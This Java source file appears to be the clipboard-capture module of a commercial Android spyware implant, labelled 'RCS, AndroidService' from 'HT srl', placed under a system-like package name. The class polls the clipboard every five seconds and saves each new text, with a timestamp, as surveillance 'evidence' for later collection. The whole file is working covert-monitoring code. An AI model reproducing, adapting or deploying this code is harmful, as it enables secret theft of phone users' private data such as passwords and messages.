/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent;

import java.util.ArrayList;

import android.content.Context;
import android.text.ClipboardManager;

import com.android.service.LogR;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.evidence.Evidence;
import com.android.service.evidence.EvidenceType;
import com.android.service.util.Check;
import com.android.service.util.DateTime;
import com.android.service.util.Utils;
import com.android.service.util.WChar;

public class AgentClipboard extends AgentBase {
	private static final String TAG = "AgentClipboard";

	ClipboardManager clipboardManager;
	static String lastClip = "";

	@Override
	public boolean parse(AgentConf conf) {
		setPeriod(5000);
		return true;
	}

	@Override
	public void go() {

		final String ret = clipboardManager.getText().toString();
		if (ret != null && !ret.equals(lastClip)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): captured " + ret);
			}
			saveEvidence(ret);
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {

		final byte[] tm = (new DateTime()).getStructTm();
		final byte[] payload = WChar.getBytes(ret.toString(), true);
		final byte[] process = WChar.getBytes("", true);
		final byte[] window = WChar.getBytes("", true);

		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		items.add(tm);
		items.add(process);
		items.add(window);
		items.add(payload);
		items.add(Utils.intToByteArray(Evidence.EVIDENCE_DELIMITER));

		final LogR log = new LogR(EvidenceType.CLIPBOARD);
		log.write(items);
		log.close();

	}

	@Override
	public void begin() {
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		if (Cfg.DEBUG) {
			Check.ensures(clipboardManager != null, "Null clipboard manager");
		}
	}

	@Override
	public void end() {
		clipboardManager = null;
	}

}
